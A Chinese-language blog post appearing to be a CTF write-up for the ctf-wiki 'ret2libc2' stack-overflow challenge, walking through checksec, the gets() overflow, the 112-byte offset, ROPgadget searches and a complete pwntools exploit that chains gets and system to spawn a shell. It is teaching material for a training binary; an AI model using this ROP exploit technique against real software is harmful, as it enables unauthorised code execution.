---
layout: post
title: CTF-PWN实例4（ret2libc2）
categories: 
 - CTF
 - PWN
 - 二进制
permalink: /pwn/4
nocomments: true  # Disable the comment box. This is EasyBook feature
typora-root-url: ..\_site
---

# CTF-PWN实例4（ret2libc2）

## 题目地址：

https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2libc/ret2libc2

## 程序保护：

```shell
$ checksec ret2libc2
```

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

首先这里依旧开启了NX保护。

## 程序信息：

```shell
file ret2libc2
ret2libc2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=83535a471d9ef90c3d5ff7f077944fb6021787a1, not stripped
```

依旧动态链接。

## 解题：

### 一、IDA分析程序溢出点

IDA分析main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("Something surprise here, but I don't think it will work.");
  printf("What do you think ?");
  gets((char *)&v4);
  return 0;
}
```

这里依旧是gets()函数造成溢出。但是这里我们可以在函数列表发现system函数。查看此函数的调用点。

```c
void secure()
{
  unsigned int v0; // eax@1
  int input; // [sp+18h] [bp-10h]@1
  int secretcode; // [sp+1Ch] [bp-Ch]@1

  v0 = time(0);
  srand(v0);
  secretcode = rand();
  __isoc99_scanf((const char *)&unk_8048760, &input);
  if ( input == secretcode )
    system("no_shell_QQ");
}
```

sysrem函数中的参数依然存在问题。

### 二、cyclic和pwndbg判断偏移量

偏移量依然是112，就不做过多篇幅。

### 三、编写EXP

思路：

根据上一题思路。

依然在程序中查找“/bin/sh”字符串，

```
$ ROPgadget --binary ret2libc2 --string '/bin/sh'
Strings information
============================================================
```

发现在程序中找不到相关字符串。

这时候可以利用gets()函数讲‘/bin/sh’这个字符串读取到栈中，然后调用即可。这时候我们得shellcode就需要两个函数，两个函数的链接就需要继续用到ROP将两个函数链接。而其中的以ret结尾的代码就叫gadget。

这里我们使用ROPgadget查找一个pop ebx；ret的地址。其实这里主要是通过

```shell
$ ROPgadget --binary ret2libc2 --only 'pop|ret' |grep 'ebx'
0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804843d : pop ebx ; ret
```

exp代码：

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *

p = process('./ret2libc2')
elf = ELF('./ret2libc2')
rop = ROP(elf)

if args.G:     #开启调试标记
    gdb.attach(p)

p.sendline('a'*112+p32(elf.plt['gets'])+p32(0x0804843d)+p32(elf.bss()+0X100)\
           +p32(elf.plt['system'])+'aaaa'+p32(elf.bss()+0X100))

p.interactive()
```

这里rop的利用主要是将两个函数进行链接，让gets函数的返回地址返回到system继续执行。

## 总结

rop技术需要良好的汇编基础，所以目前例子只是简单使用，之后会有详细介绍。